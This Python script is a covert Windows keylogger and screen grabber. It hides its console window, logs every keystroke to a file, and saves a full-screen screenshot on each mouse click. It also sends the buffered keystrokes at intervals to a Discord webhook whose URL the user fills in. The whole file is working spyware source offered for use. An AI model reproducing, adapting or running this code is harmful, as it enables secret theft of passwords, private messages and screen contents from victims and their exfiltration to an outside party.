from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from dhooks import Webhook
from threading import Timer
import os
from PIL import ImageGrab
from pynput.keyboard import Key
from PIL import Image

WEBHOOK_URL = 'Enter Your Discord Webhook URL'
DISCORD_TIME_INTERVAL = 30
i = 0

# Function to hide the console window
def hide_console():
    import win32console
    import win32gui
    the_program_to_hide = win32console.GetConsoleWindow()
    win32gui.ShowWindow(the_program_to_hide, 0)

class Keylogger:
    def __init__(self, webhook_url, discord_interval):
        self.discord_interval = discord_interval
        self.webhook = Webhook(webhook_url)
        self.keystrokes_buffer = []  # Store keystrokes in a buffer
        self.current_word = ""
        self.keystrokes_file_path = "keystrokes.txt"

    def _report(self):
        try:
            if self.keystrokes_buffer:
                # Join the keystrokes and send them to Discord
                self.webhook.send("\n".join(self.keystrokes_buffer))
                self.keystrokes_buffer = []  # Clear the buffer
            Timer(self.discord_interval, self._report).start()
        except Exception as e:
            print(f"Error sending data to Discord: {e}")

    def _on_key_press(self, key):
        try:
            key_str = str(key)
            if key == Key.space:
                self.keystrokes_buffer.append(self.current_word)
                self.current_word = ""
            elif key == Key.enter:
                self.keystrokes_buffer.append(self.current_word)
                self.current_word = ""
            elif key == Key.backspace:
                if self.current_word:
                    self.current_word = self.current_word[:-1]
                else:
                    # Delete the previous letter or "n" letters or spaces
                    num_deletions = 1  # Change this value to delete more characters
                    self.keystrokes_buffer = self.keystrokes_buffer[:-num_deletions]
            else:
                if len(key_str) == 3:
                    if key_str[1] == "'":
                        self.current_word += key_str[0]
                    else:
                        self.current_word += key_str
                elif key == Key.shift:
                    pass  # You can handle the Shift key if needed
                elif key_str[1] != "'":
                    self.current_word += key_str[0]
            
            # Immediately write the keystroke to the file
            with open(self.keystrokes_file_path, 'a') as file:
                file.write(str(key))
        except Exception as e:
            print(f"Error capturing keystroke: {e}")

    def _on_click(self, x, y, button, pressed):
        try:
            global i
            if pressed:
                # Capture the entire screen
                img = ImageGrab.grab()

                # Define the output file path
                ans = os.getcwd()
                ans = ans + '/' + str(i) + '.jpg'

                # Save the image as a JPEG with a specific compression level
                img.save(ans, "JPEG", quality=10)  # You can adjust the quality as needed

                # Check the file size and continue compressing if it's larger than 100 KB
                while os.path.getsize(ans) > 100 * 1024:  # 100 KB
                    img.save(ans, "JPEG", quality=5)  # Adjust quality for further compression

                i += 1
        except Exception as e:
            print(f"Error capturing screenshot: {e}")

    def run(self):
        self._report()
        with KeyboardListener(on_press=self._on_key_press), MouseListener(on_click=self._on_click) as t:
            t.join()

if __name__ == '__main__':
    hide_console()
    keylogger = Keylogger(WEBHOOK_URL, DISCORD_TIME_INTERVAL)
    keylogger.run()
